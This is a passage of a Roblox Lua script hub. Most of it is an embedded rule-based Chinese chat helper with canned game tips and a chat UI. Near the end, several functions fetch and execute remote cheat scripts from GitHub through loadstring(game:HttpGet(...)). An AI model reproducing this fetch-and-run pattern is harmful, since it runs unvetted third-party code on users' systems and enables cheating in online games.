                            "拥有房屋、车辆和各种社交场所。",
                            "适合与朋友一起游玩。",
                            "通过工作可以赚取游戏币。",
                            "房屋和车辆可以自定义装饰。"
                        },
                        popularItems = {"别墅", "跑车", "警车", "直升机", "豪宅"}
                    },
                    ["arsenal"] = {
                        title = "Arsenal",
                        genre = "第一人称射击",
                        description = "快节奏的射击游戏，有各种武器和游戏模式。玩家通过击杀敌人升级武器。",
                        features = {
                            "多种游戏模式：团队死亡竞赛、自由对战等",
                            "超过50种不同的武器",
                            "皮肤和角色定制",
                            "定期更新新武器和地图",
                            "排行榜和成就系统"
                        },
                        tips = {
                            "练习瞄准和移动技巧。",
                            "了解不同武器的特性。",
                            "参与限时活动获取特殊皮肤。",
                            "利用掩体保护自己。",
                            "与队友配合更容易获胜。"
                        },
                        popularItems = {"黄金武器", "传奇皮肤", "稀有角色", "特效", "刀械"}
                    },
                    ["jailbreak"] = {
                        title = "Jailbreak",
                        genre = "动作/冒险",
                        description = "扮演囚犯或警察，进行追逐和逃脱。可以抢劫银行、驾驶各种车辆。",
                        features = {
                            "扮演囚犯或警察",
                            "抢劫银行、珠宝店等",
                            "各种车辆包括汽车、飞机、直升机",
                            "基地和藏身处系统",
                            "季节通行证和奖励"
                        },
                        tips = {
                            "囚犯需要计划逃脱路线。",
                            "警察可以使用各种工具追捕。",
                            "可以抢劫银行和完成各种任务。",
                            "购买更好的车辆提高效率。",
                            "与队友合作更容易成功。"
                        },
                        popularItems = {"黑鹰直升机", "兰博基尼", "特斯拉", "喷气背包", "导弹"}
                    },
                    ["blox fruits"] = {
                        title = "Blox Fruits",
                        genre = "冒险/RPG",
                        description = "基于海贼王题材的冒险游戏，玩家可以吃恶魔果实获得能力，探索广阔的世界。",
                        features = {
                            "多种恶魔果实能力",
                            "剑术、武术等战斗风格",
                            "航海和岛屿探索",
                            "boss战和地下城",
                            "公会系统和团队副本"
                        },
                        tips = {
                            "选择合适的恶魔果实很重要。",
                            "升级剑术和武术技能。",
                            "组队挑战boss更容易。",
                            "探索不同岛屿获取稀有物品。",
                            "加入公会获得额外奖励。"
                        },
                        popularItems = {"橡皮果实", "火拳果实", "黑暗果实", "名刀", "传奇装备"}
                    }
                }
            }
            
            function SemanticEngine:UnderstandMessage(message, memory)
                local result = {
                    intent = "conversation",
                    entities = {},
                    topic = nil,
                    game = nil,
                    requiresAction = false,
                    actionType = nil
                }
                
                local lowerMsg = string.lower(message)
                result.intent = self:ClassifyIntent(lowerMsg)
                result.entities = self:ExtractEntities(lowerMsg)
                result.topic = self:IdentifyTopic(lowerMsg, memory)
                result.game = self:IdentifyGame(lowerMsg, memory)
                result.requiresAction, result.actionType = self:CheckForAction(lowerMsg)
                
                return result
            end
            
            function SemanticEngine:ClassifyIntent(message)
                local intentPatterns = {
                    greeting = {"你好", "嗨", "hello", "hi ", "早上好", "晚上好", "午安", "晚安"},
                    question = {"什么", "怎么", "如何", "为什么", "？", "?", "who", "what", "how", "why", "哪里", "哪个"},
                    command = {"帮助", "清空", "重置", "设置", "退出", "关闭", "最小化"},
                    gameQuery = {"游戏", "怎么玩", "攻略", "技巧", "tip", "game", "play", "roblox游戏", "玩法", "秘籍"},
                    emotional = {"开心", "难过", "生气", "兴奋", "喜欢", "讨厌", "love", "hate", "happy", "sad", "烦"},
                    farewell = {"再见", "拜拜", "bye", "see you", "下次聊", "88", "拜拜了"},
                    recommendation = {"推荐", "有什么好玩的", "玩什么", "哪个好玩", "建议", "推荐游戏"},
                    comparison = {"对比", "比较", "哪个好", "区别", "不同", "vs", " versus "},
                    help = {"求助", "救命", "帮忙", "求教", "请教", "不会", "不懂", "卡住了"}
                }
                
                for intent, patterns in pairs(intentPatterns) do
                    for _, pattern in ipairs(patterns) do
                        if string.find(message, pattern) then
                            return intent
                        end
                    end
                end
                
                return "conversation"
            end
            
            function SemanticEngine:ExtractEntities(message)
                local entities = {}
                
                for gameName, _ in pairs(self.gameKnowledge) do
                    if string.find(message, gameName) then
                        table.insert(entities, {type = "game", value = gameName})
                    end
                end
                
                for _, genre in ipairs(GameKeywords.gameGenres) do
                    if string.find(message, string.lower(genre)) then
                        table.insert(entities, {type = "genre", value = genre})
                    end
                end
                
                for _, item in ipairs(GameKeywords.gameItems) do
                    if string.find(message, item) then
                        table.insert(entities, {type = "item", value = item})
                    end
                end
                
                return entities
            end
            
            function SemanticEngine:IdentifyTopic(message, memory)
                local recentTopics = memory:GetRecentTopics(3)
                if #recentTopics > 0 then
                    for _, topic in ipairs(recentTopics) do
                        if string.find(message, topic) then
                            return topic
                        end
                    end
                end
                
                local topicPatterns = {
                    ["游戏推荐"] = {"推荐", "有什么好玩的", "玩什么", "新游戏", "热门游戏"},
                    ["游戏攻略"] = {"攻略", "怎么玩", "技巧", "秘籍", "过关", "通关"},
                    ["游戏问题"] = {"bug", "错误", "问题", "卡住了", "进不去", "闪退"},
                    ["游戏更新"] = {"更新", "新内容", "新版本", "赛季", "活动"},
                    ["游戏交易"] = {"交易", "买卖", "价格", "值钱", "值多少", "robux"},
                    ["游戏比较"] = {"对比", "比较", "哪个好", "区别", "不同", "vs"},
                    ["游戏社交"] = {"朋友", "组队", "一起玩", "公会", "社团", "交友"}
                }
                
                for topic, patterns in pairs(topicPatterns) do
                    for _, pattern in ipairs(patterns) do
                        if string.find(message, pattern) then
                            return topic
                        end
                    end
                end
                
                return nil
            end
            
            function SemanticEngine:IdentifyGame(message, memory)
                for gameName, _ in pairs(self.gameKnowledge) do
                    if string.find(message, gameName) then
                        return gameName
                    end
                end
                
                local recentGames = memory:GetRecentGames(1)
                if #recentGames > 0 then
                    return recentGames[1]
                end
                
                return nil
            end
            
            function SemanticEngine:CheckForAction(message)
                local commandPatterns = {
                    {"帮助", "help", "功能", "命令"},
                    {"清空", "清除", "重置聊天", "clear"},
                    {"退出", "关闭", "exit", "quit"}
                }
                
                for _, patterns in ipairs(commandPatterns) do
                    for _, pattern in ipairs(patterns) do
                        if string.find(message, pattern) then
                            return true, "command"
                        end
                    end
                end
                
                return false, nil
            end
            
            function SemanticEngine:GetGameInfo(gameName)
                return self.gameKnowledge[string.lower(gameName)]
            end
            
            function SemanticEngine:GenerateContextualResponse(userMessage, memory, intent, entities, topic, game)
                local response = ""
                
                if intent == "greeting" then
                    response = self:GenerateGreeting(userMessage, memory, game)
                elseif intent == "question" then
                    response = self:AnswerQuestion(userMessage, entities, topic, game, memory)
                elseif intent == "gameQuery" then
                    response = self:AnswerGameQuestion(userMessage, entities, game, memory)
                elseif intent == "emotional" then
                    response = self:RespondToEmotion(userMessage, memory)
                elseif intent == "command" then
                    response = self:HandleCommand(userMessage)
                elseif intent == "recommendation" then
                    response = self:GenerateRecommendation(userMessage, memory)
                elseif intent == "comparison" then
                    response = self:GenerateComparison(userMessage, memory)
                elseif intent == "help" then
                    response = self:ProvideHelp(userMessage, memory)
                elseif intent == "farewell" then
                    response = self:GenerateFarewell(userMessage, memory)
                else
                    response = self:ContinueConversation(userMessage, memory, topic, game)
                end
                
                if game and math.random() < 0.4 then
                    response = response .. " " .. self:AddGameContext(game, memory)
                end
                
                return response
            end
            
            function SemanticEngine:GenerateGreeting(message, memory, game)
                local greetings = {
                    "你好！很高兴再次见到你！",
                    "欢迎回来！今天过得怎么样？",
                    "嗨！我一直在等你呢！",
                    "你好呀！准备好开始聊天了吗？"
                }
                
                local hour = tonumber(os.date("%H"))
                local timeOfDay = "你好！"
                if hour >= 5 and hour < 12 then
                    timeOfDay = "🌅 早上好！"
                elseif hour >= 12 and hour < 14 then
                    timeOfDay = "☀️ 中午好！"
                elseif hour >= 14 and hour < 18 then
                    timeOfDay = "🌤️ 下午好！"
                elseif hour >= 18 and hour < 22 then
                    timeOfDay = "🌙 晚上好！"
                else
                    timeOfDay = "🌃 夜深了，"
                end
                
                local personalGreeting = string.format("%s %s", timeOfDay, greetings[math.random(#greetings)])
                
                local lastGame = memory:GetRecentGames(1)
                if #lastGame > 0 then
                    local gameName = lastGame[1]
                    local gameInfo = self:GetGameInfo(gameName)
                    if gameInfo then
                        personalGreeting = personalGreeting .. string.format(" 还在玩%s吗？", gameInfo.title)
                    end
                end
                
                return personalGreeting
            end
            
            function SemanticEngine:AnswerQuestion(question, entities, topic, game, memory)
                if game then
                    local gameInfo = self:GetGameInfo(game)
                    if gameInfo then
                        return self:GenerateGameAnswer(question, gameInfo, entities)
                    end
                end
                
                if #entities > 0 then
                    for _, entity in ipairs(entities) do
                        if entity.type == "game" then
                            local gameInfo = self:GetGameInfo(entity.value)
                            if gameInfo then
                                return self:GenerateGameAnswer(question, gameInfo, entities)
                            end
                        end
                    end
                end
                
                local genericAnswers = {
                    "这是一个很好的问题！让我想想...",
                    "我理解你想知道" .. string.sub(question, 1, 20) .. "...",
                    "关于这个问题，我的理解是...",
                    "根据我的知识库，我可以告诉你...",
                    "这个问题涉及到几个方面..."
                }
                
                return genericAnswers[math.random(#genericAnswers)] .. " 如果你有具体想了解的内容，可以告诉我更多细节。"
            end
            
            function SemanticEngine:GenerateGameAnswer(question, gameInfo, entities)
                local responses = {
                    string.format("关于%s：%s", gameInfo.title, gameInfo.description),
                    string.format("%s是一款%s游戏。%s", gameInfo.title, gameInfo.genre, gameInfo.description)
                }
                
                local response = responses[math.random(#responses)]
                
                if #gameInfo.features > 0 then
                    response = response .. "\n\n游戏特色："
                    for i = 1, math.min(3, #gameInfo.features) do
                        response = response .. "\n• " .. gameInfo.features[i]
                    end
                end
                
                if #gameInfo.tips > 0 then
                    response = response .. "\n\n小贴士："
                    for i = 1, math.min(3, #gameInfo.tips) do
                        response = response .. "\n• " .. gameInfo.tips[i]
                    end
                end
                
                if gameInfo.popularItems and #gameInfo.popularItems > 0 then
                    response = response .. "\n\n热门物品：" .. table.concat(gameInfo.popularItems, "、")
                end
                
                return response
            end
            
            function SemanticEngine:AnswerGameQuestion(question, entities, game, memory)
                if game then
                    local gameInfo = self:GetGameInfo(game)
                    if gameInfo then
                        return self:GenerateGameAnswer(question, gameInfo, entities)
                    end
                end
                
                for _, entity in ipairs(entities) do
                    if entity.type == "game" then
                        local gameInfo = self:GetGameInfo(entity.value)
                        if gameInfo then
                            return self:GenerateGameAnswer(question, gameInfo, entities)
                        end
                    end
                end
                
                local gameAdvice = {
                    "在Roblox玩游戏时，建议：\n1. 找到适合自己兴趣的游戏\n2. 和朋友一起玩更有趣\n3. 尝试不同类型的游戏扩展体验\n4. 注意游戏时间和消费",
                    "热门游戏推荐：\n• Adopt Me - 宠物养成\n• Brookhaven - 社交角色扮演\n• Arsenal - 射击游戏\n• Jailbreak - 警匪追逐\n• Blox Fruits - 冒险RPG\n\n你想了解哪款游戏的具体玩法？",
                    "提高游戏技巧的方法：\n1. 多练习基础操作\n2. 观看高手游玩视频\n3. 和朋友组队学习\n4. 参加社区讨论\n5. 关注游戏更新和补丁说明"
                }
                
                return gameAdvice[math.random(#gameAdvice)]
            end
            
            function SemanticEngine:RespondToEmotion(message, memory)
                local emotion = memory.userPreferences.lastEmotion or "中性"
                
                local responses = {
                    ["开心"] = {
                        "听到你开心我也很高兴！😊 有什么特别想分享的吗？",
                        "太好了！开心的时刻值得庆祝！🎉",
                        "能感受到你的快乐，这让我也很开心！✨"
                    },
                    ["沮丧"] = {
                        "抱抱你 🤗 如果你需要倾诉，我随时在这里。",
                        "听起来你遇到了一些困难，想聊聊吗？",
                        "无论发生什么，记住我都在这里支持你。💪"
                    },
                    ["兴奋"] = {
                        "哇！听起来很让人兴奋！🚀",
                        "感受到你的热情了！一起期待吧！",
                        "这太棒了！我也被你的兴奋感染了！🎯"
                    },
                    ["求助"] = {
                        "别担心，我来帮你！有什么问题尽管问。🆘",
                        "遇到困难了？告诉我具体情况，我会尽力帮助你。",
                        "需要帮忙吗？我很乐意为你提供支持。🤝"
                    },
                    ["中性"] = {
                        "我明白你的意思。",
                        "嗯，继续说吧。",
                        "我在认真听着。👂"
                    }
                }
                
                local emotionResponses = responses[emotion] or responses["中性"]
                return emotionResponses[math.random(#emotionResponses)]
            end
            
            function SemanticEngine:HandleCommand(command)
                if string.find(command, "帮助") or string.find(command, "help") then
                    return "我可以帮助你：\n1. 回答Roblox游戏相关问题\n2. 提供游戏攻略和技巧\n3. 聊天和交流\n4. 解释编程概念\n5. 提供创作建议\n6. 推荐好玩的游戏\n7. 比较不同游戏\n\n试试问我具体的问题！"
                end
                
                if string.find(command, "清空") or string.find(command, "清除") then
                    return "[COMMAND:CLEAR_CHAT]聊天记录已清空，让我们重新开始吧！✨"
                end
                
                return "我收到了你的指令。有什么其他需要帮助的吗？"
            end
            
            function SemanticEngine:GenerateRecommendation(message, memory)
                local recentGames = memory:GetRecentGames(2)
                local recommendations = {
                    "根据你的喜好，我推荐这些游戏：\n1. Adopt Me - 宠物养成和社交\n2. Brookhaven - 角色扮演和生活模拟\n3. Arsenal - 快节奏射击游戏\n4. Blox Fruits - 冒险和探索\n\n你比较喜欢哪种类型呢？",
                    "热门游戏推荐：\n• 喜欢养宠物？试试 Adopt Me！\n• 想和朋友一起玩？Brookhaven 很适合！\n• 喜欢射击游戏？Arsenal 很不错！\n• 想体验冒险？Blox Fruits 等着你！",
                    "不同类型的游戏推荐：\n🎮 射击游戏：Arsenal, Phantom Forces\n🏠 社交游戏：Brookhaven, MeepCity\n🐾 养成游戏：Adopt Me, Pet Simulator\n⚔️ 冒险游戏：Blox Fruits, King Legacy\n\n你想了解哪一款的具体信息？"
                }
                
                if #recentGames > 0 then
                    local gameName = recentGames[1]
                    local gameInfo = self:GetGameInfo(gameName)
                    if gameInfo then
                        local similarGames = {
                            ["adopt me"] = {"Pet Simulator", "Dragon Adventures", "Wild Horse Islands"},
                            ["brookhaven"] = {"MeepCity", "Welcome to Bloxburg", "Royale High"},
                            ["arsenal"] = {"Phantom Forces", "Bad Business", "Counter Blox"},
                            ["jailbreak"] = {"Mad City", "Vehicle Legends", "Car Dealership Tycoon"},
                            ["blox fruits"] = {"King Legacy", "One Fruit Simulator", "Fruit Battlegrounds"}
                        }
                        
                        if similarGames[gameName] then
                            return string.format("如果你喜欢%s，可能也会喜欢这些游戏：%s", 
                                gameInfo.title, table.concat(similarGames[gameName], "、"))
                        end
                    end
                end
                
                return recommendations[math.random(#recommendations)]
            end
            
            function SemanticEngine:GenerateComparison(message, memory)
                local comparisons = {
                    "Adopt Me vs Brookhaven：\n• Adopt Me 更注重宠物养成和收集\n• Brookhaven 更注重社交和角色扮演\n• 两者都是很受欢迎的游戏，看个人喜好",
                    "Arsenal vs Jailbreak：\n• Arsenal 是快节奏射击游戏\n• Jailbreak 是警匪追逐游戏\n• 喜欢射击选Arsenal，喜欢冒险选Jailbreak",
                    "Blox Fruits vs Adopt Me：\n• Blox Fruits 是冒险RPG游戏\n• Adopt Me 是宠物养成游戏\n• 喜欢战斗选Blox Fruits，喜欢收集选Adopt Me"
                }
                
                return comparisons[math.random(#comparisons)]
            end
            
            function SemanticEngine:ProvideHelp(message, memory)
                local helpResponses = {
                    "遇到问题了吗？告诉我具体情况，我会尽力帮你解决。常见问题：\n1. 游戏进不去\n2. 不知道怎么玩\n3. 卡在某个任务\n4. 物品丢失\n\n详细描述你的问题，我会提供帮助。",
                    "需要帮助？先试试这些方法：\n1. 重启游戏\n2. 检查网络连接\n3. 查看游戏公告\n4. 询问其他玩家\n\n如果还不行，告诉我具体问题。",
                    "我来帮你！请告诉我：\n1. 你在玩什么游戏？\n2. 遇到了什么问题？\n3. 问题发生多久了？\n4. 有什么错误信息？\n\n我会根据这些信息帮你分析。"
                }
                
                return helpResponses[math.random(#helpResponses)]
            end
            
            function SemanticEngine:GenerateFarewell(message, memory)
                local farewells = {
                    "再见！期待下次和你聊天！👋",
                    "拜拜！祝你游戏愉快！🎮",
                    "下次见！有什么问题随时来找我！😊",
                    "再见啦！记得好好休息哦！💤"
                }
                
                return farewells[math.random(#farewells)]
            end
            
            function SemanticEngine:ContinueConversation(message, memory, topic, game)
                local conversationalResponses = {
                    "我明白你的意思。",
                    "这听起来很有趣！",
                    "然后发生了什么？",
                    "能告诉我更多吗？",
                    "我理解你的观点。",
                    "这让我想到...",
                    "真是个不错的想法！"
                }
                
                local response = conversationalResponses[math.random(#conversationalResponses)]
                
                if memory:GetRecentTopics(1) then
                    response = response .. " 你之前提到的内容也很有趣。"
                end
                
                return response
            end
            
            function SemanticEngine:AddGameContext(game, memory)
                local references = {
                    "关于这个游戏，",
                    "说到游戏，",
                    "让我想起，",
                    "与此相关的，"
                }
                
                local gameInfo = self:GetGameInfo(game)
                if gameInfo then
                    return string.format("%s%s是%s游戏。", 
                        references[math.random(#references)], 
                        gameInfo.title, gameInfo.genre)
                end
                
                return ""
            end
            
            -- AIChat类
            local AIChat = {}
            AIChat.__index = AIChat
            
            function AIChat.new()
                local self = setmetatable({}, AIChat)
                
                self.Memory = {
                    MAX_HISTORY = 25,
                    history = {},
                    context = {},
                    topics = {},
                    userPreferences = {},
                    gameMentions = {},
                    
                    AddMessage = function(memory, role, content)
                        DialogueMemory.AddMessage(memory, role, content)
                    end,
                    AnalyzeMessage = DialogueMemory.AnalyzeMessage,
                    ExtractGameEntities = DialogueMemory.ExtractGameEntities,
                    ExtractMentionedGames = DialogueMemory.ExtractMentionedGames,
                    IdentifyTopic = DialogueMemory.IdentifyTopic,
                    DetectEmotion = DialogueMemory.DetectEmotion,
                    GetRecentTopics = DialogueMemory.GetRecentTopics,
                    GetRecentGames = DialogueMemory.GetRecentGames,
                    Clear = DialogueMemory.Clear
                }
                
                self.Engine = {
                    gameKnowledge = SemanticEngine.gameKnowledge,
                    UnderstandMessage = SemanticEngine.UnderstandMessage,
                    ClassifyIntent = SemanticEngine.ClassifyIntent,
                    ExtractEntities = SemanticEngine.ExtractEntities,
                    IdentifyTopic = SemanticEngine.IdentifyTopic,
                    IdentifyGame = SemanticEngine.IdentifyGame,
                    CheckForAction = SemanticEngine.CheckForAction,
                    GetGameInfo = SemanticEngine.GetGameInfo,
                    GenerateContextualResponse = SemanticEngine.GenerateContextualResponse,
                    GenerateGreeting = SemanticEngine.GenerateGreeting,
                    AnswerQuestion = SemanticEngine.AnswerQuestion,
                    GenerateGameAnswer = SemanticEngine.GenerateGameAnswer,
                    AnswerGameQuestion = SemanticEngine.AnswerGameQuestion,
                    RespondToEmotion = SemanticEngine.RespondToEmotion,
                    HandleCommand = SemanticEngine.HandleCommand,
                    GenerateRecommendation = SemanticEngine.GenerateRecommendation,
                    GenerateComparison = SemanticEngine.GenerateComparison,
                    ProvideHelp = SemanticEngine.ProvideHelp,
                    GenerateFarewell = SemanticEngine.GenerateFarewell,
                    ContinueConversation = SemanticEngine.ContinueConversation,
                    AddGameContext = SemanticEngine.AddGameContext
                }
                
                self.UI = nil
                self.isActive = true
                
                return self
            end
            
            function AIChat:CreateUI()
                local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
                
                if PlayerGui:FindFirstChild("EnhancedAIChatUI") then
                    PlayerGui:FindFirstChild("EnhancedAIChatUI"):Destroy()
                end
                
                local ScreenGui = Instance.new("ScreenGui")
                ScreenGui.Name = "EnhancedAIChatUI"
                ScreenGui.ResetOnSpawn = false
                ScreenGui.DisplayOrder = 100
                
                local MainFrame = Instance.new("Frame")
                MainFrame.Name = "MainFrame"
                MainFrame.Size = UDim2.new(0, 400, 0, 600)
                MainFrame.Position = UDim2.new(1, -420, 0.5, -300)
                MainFrame.AnchorPoint = Vector2.new(0, 0.5)
                MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
                MainFrame.BorderSizePixel = 1
                MainFrame.BorderColor3 = Color3.fromRGB(80, 80, 100)
                MainFrame.Parent = ScreenGui
                
                local TitleBar = Instance.new("Frame")
                TitleBar.Name = "TitleBar"
                TitleBar.Size = UDim2.new(1, 0, 0, 40)
                TitleBar.Position = UDim2.new(0, 0, 0, 0)
                TitleBar.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
                TitleBar.BorderSizePixel = 0
                TitleBar.Parent = MainFrame
                
                local Title = Instance.new("TextLabel")
                Title.Name = "Title"
                Title.Size = UDim2.new(1, -40, 1, 0)
                Title.Position = UDim2.new(0, 10, 0, 0)
                Title.BackgroundTransparency = 1
                Title.Text = "Roblox AI助手"
                Title.TextColor3 = Color3.fromRGB(255, 255, 255)
                Title.TextSize = 20
                Title.TextXAlignment = Enum.TextXAlignment.Left
                Title.Font = Enum.Font.SourceSansBold
                Title.Parent = TitleBar
                
                local CloseButton = Instance.new("TextButton")
                CloseButton.Name = "CloseButton"
                CloseButton.Size = UDim2.new(0, 30, 0, 30)
                CloseButton.Position = UDim2.new(1, -35, 0.5, -15)
                CloseButton.AnchorPoint = Vector2.new(1, 0.5)
                CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                CloseButton.Text = "X"
                CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                CloseButton.TextSize = 16
                CloseButton.Font = Enum.Font.SourceSansBold
                CloseButton.Parent = TitleBar
                
                local ChatContainer = Instance.new("ScrollingFrame")
                ChatContainer.Name = "ChatContainer"
                ChatContainer.Size = UDim2.new(1, 0, 1, -100)
                ChatContainer.Position = UDim2.new(0, 0, 0, 40)
                ChatContainer.BackgroundTransparency = 1
                ChatContainer.BorderSizePixel = 0
                ChatContainer.ScrollBarThickness = 8
                ChatContainer.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 120)
                ChatContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
                ChatContainer.ScrollingDirection = Enum.ScrollingDirection.Y
                ChatContainer.Parent = MainFrame
                
                local UIListLayout = Instance.new("UIListLayout")
                UIListLayout.Padding = UDim.new(0, 10)
                UIListLayout.Parent = ChatContainer
                
                local InputArea = Instance.new("Frame")
                InputArea.Name = "InputArea"
                InputArea.Size = UDim2.new(1, 0, 0, 60)
                InputArea.Position = UDim2.new(0, 0, 1, -60)
                InputArea.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
                InputArea.BorderSizePixel = 0
                InputArea.Parent = MainFrame
                
                local InputBox = Instance.new("TextBox")
                InputBox.Name = "InputBox"
                InputBox.Size = UDim2.new(1, -100, 1, -20)
                InputBox.Position = UDim2.new(0, 10, 0, 10)
                InputBox.BackgroundColor3 = Color3.fromRGB(70, 70, 80)
                InputBox.BorderSizePixel = 0
                InputBox.Text = ""
                InputBox.PlaceholderText = "输入消息..."
                InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
                InputBox.TextSize = 16
                InputBox.TextXAlignment = Enum.TextXAlignment.Left
                InputBox.ClearTextOnFocus = false
                InputBox.Font = Enum.Font.SourceSans
                InputBox.Parent = InputArea
                
                local SendButton = Instance.new("TextButton")
                SendButton.Name = "SendButton"
                SendButton.Size = UDim2.new(0, 80, 0, 40)
                SendButton.Position = UDim2.new(1, -90, 0.5, -20)
                SendButton.AnchorPoint = Vector2.new(1, 0.5)
                SendButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
                SendButton.BorderSizePixel = 0
                SendButton.Text = "发送"
                SendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                SendButton.TextSize = 16
                SendButton.Font = Enum.Font.SourceSansBold
                SendButton.Parent = InputArea
                
                ScreenGui.Parent = PlayerGui
                
                self.UI = {
                    ScreenGui = ScreenGui,
                    MainFrame = MainFrame,
                    TitleBar = TitleBar,
                    ChatContainer = ChatContainer,
                    InputBox = InputBox,
                    SendButton = SendButton,
                    CloseButton = CloseButton
                }
                
                SendButton.MouseButton1Click:Connect(function()
                    self:ProcessUserInput()
                end)
                
                InputBox.FocusLost:Connect(function(enterPressed)
                    if enterPressed then
                        self:ProcessUserInput()
                    end
                end)
                
                CloseButton.MouseButton1Click:Connect(function()
                    self:ToggleUI()
                end)
                
                self:AddMessage("system", "🤖 Roblox AI助手已启动！\n我可以帮助你：\n• 回答Roblox游戏相关问题\n• 提供游戏攻略和技巧\n• 推荐好玩的游戏\n• 聊天交流\n\n试试问我关于Adopt Me、Brookhaven等游戏的问题！")
                
                return ScreenGui
            end
            
            function AIChat:AddMessage(sender, message, isSystem)
                local bubble = Instance.new("Frame")
                bubble.Name = "MessageBubble"
                bubble.BackgroundTransparency = 1
                bubble.Size = UDim2.new(1, -20, 0, 0)
                bubble.AutomaticSize = Enum.AutomaticSize.Y
                bubble.Parent = self.UI.ChatContainer
                
                local textLabel = Instance.new("TextLabel")
                textLabel.Name = "Text"
                textLabel.Size = UDim2.new(1, 0, 0, 0)
                textLabel.AutomaticSize = Enum.AutomaticSize.Y
                textLabel.BackgroundColor3 = isSystem and Color3.fromRGB(60, 60, 70) or 
                    (sender == "user" and Color3.fromRGB(0, 100, 200) or Color3.fromRGB(80, 80, 90))
                textLabel.BackgroundTransparency = 0
                textLabel.BorderSizePixel = 0
                textLabel.Text = message
                textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                textLabel.TextSize = 16
                textLabel.TextWrapped = true
                textLabel.TextXAlignment = Enum.TextXAlignment.Left
                textLabel.Font = Enum.Font.SourceSans
                
                local padding = Instance.new("UIPadding")
                padding.PaddingLeft = UDim.new(0, 10)
                padding.PaddingRight = UDim.new(0, 10)
                padding.PaddingTop = UDim.new(0, 8)
                padding.PaddingBottom = UDim.new(0, 8)
                padding.Parent = textLabel
                
                local corner = Instance.new("UICorner")
                corner.CornerRadius = UDim.new(0, 8)
                corner.Parent = textLabel
                
                local senderLabel = Instance.new("TextLabel")
                senderLabel.Name = "Sender"
                senderLabel.Size = UDim2.new(1, 0, 0, 20)
                senderLabel.Position = UDim2.new(0, 0, 0, -20)
                senderLabel.BackgroundTransparency = 1
                senderLabel.Text = (sender == "user" and "你" or "AI助手") .. " - " .. os.date("%H:%M")
                senderLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
                senderLabel.TextSize = 12
                senderLabel.TextXAlignment = Enum.TextXAlignment.Left
                senderLabel.Font = Enum.Font.SourceSans
                
                if sender == "user" then
                    textLabel.AnchorPoint = Vector2.new(1, 0)
                    textLabel.Position = UDim2.new(1, 0, 0, 0)
                    senderLabel.TextXAlignment = Enum.TextXAlignment.Right
                end
                
                textLabel.Parent = bubble
                senderLabel.Parent = bubble
                
                wait()
                self.UI.ChatContainer.CanvasPosition = Vector2.new(0, self.UI.ChatContainer.CanvasPosition.Y + 1000)
            end
            
            function AIChat:ProcessUserInput()
                local input = self.UI.InputBox.Text
                if input == "" then
                    return
                end
                
                self:AddMessage("user", input)
                self.Memory:AddMessage(self.Memory, "user", input)
                self.UI.InputBox.Text = ""
                
                if string.find(input, "清空") or string.find(input, "清除") then
                    for _, child in ipairs(self.UI.ChatContainer:GetChildren()) do
                        if child:IsA("Frame") then
                            child:Destroy()
                        end
                    end
                    self.Memory:Clear()
                    self:AddMessage("system", "聊天记录已清空！")
                    return
                end
                
                local understanding = self.Engine:UnderstandMessage(input, self.Memory)
                
                local response = self.Engine:GenerateContextualResponse(
                    input,
                    self.Memory,
                    understanding.intent,
                    understanding.entities,
                    understanding.topic,
                    understanding.game
                )
                
                if string.find(response, "%[COMMAND:") then
                    local command = string.match(response, "%[COMMAND:(%w+)%]")
                    if command == "CLEAR_CHAT" then
                        response = string.gsub(response, "%[COMMAND:CLEAR_CHAT%]", "")
                    end
                end
                
                wait(math.random(0.5, 1.5))
                
                self:AddMessage("assistant", response)
                self.Memory:AddMessage(self.Memory, "assistant", response)
            end
            
            function AIChat:ToggleUI()
                if self.UI and self.UI.MainFrame then
                    local isVisible = self.UI.MainFrame.Visible
                    self.UI.MainFrame.Visible = not isVisible
                end
            end
            
            function AIChat:SetupKeyboardShortcuts()
                UserInputService.InputBegan:Connect(function(input, gameProcessed)
                    if gameProcessed then return end
                    
                    if input.KeyCode == Enum.KeyCode.F2 then
                        self:ToggleUI()
                    elseif input.KeyCode == Enum.KeyCode.Slash and self.UI.MainFrame.Visible then
                        self.UI.InputBox:CaptureFocus()
                    end
                end)
            end
            
            function AIChat:Start()
                if not Players.LocalPlayer then
                    Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
                end
                
                self:CreateUI()
                self:SetupKeyboardShortcuts()
                
                self:AddMessage("system", "🔧 系统初始化完成！按F2键可显示/隐藏聊天窗口。")
                
                print("Roblox AI聊天系统已启动！")
            end
            
            -- 初始化AI聊天系统
            local aiChat = AIChat.new()
            aiChat:Start()
            
            return aiChat
        ]]
        
        -- 执行AI聊天脚本
        local success, errorMsg = pcall(function()
            loadstring(aiChatScript)()
        end)
        
        if success then
            showNotification("AI聊天系统已启动！按F2显示/隐藏窗口", Color3.fromRGB(0, 200, 0))
        else
            showNotification("AI聊天系统启动失败: " .. tostring(errorMsg), Color3.fromRGB(255, 50, 50))
            warn("AI聊天系统错误:", errorMsg)
        end
    end

    -- 新增功能函数
    local function loadStealBrainRed()
        playClickSound()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hdjsjjdgrhj/script-hub/refs/heads/main/偷走脑红"))()
        showNotification("偷走脑红脚本已加载!", Color3.fromRGB(0, 200, 0))
    end

    local function loadGarden()
        playClickSound()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
        showNotification("种植花园脚本已加载!", Color3.fromRGB(0, 200, 0))
    end

    local function loadOhio()
        playClickSound()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/jiankeQWQ/jiankeV3/main/ehaiezhou"))()
        showNotification("俄亥俄州脚本已加载!", Color3.fromRGB(0, 200, 0))
    end

    local function loadForsaken()
        playClickSound()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BobJunior1/ForsakenBoi/refs/heads/main/B0bbyHub"))()
        showNotification("被遗弃脚本已加载!", Color3.fromRGB(0, 200, 0))
    end

    local function loadThrowFly()
        playClickSound()
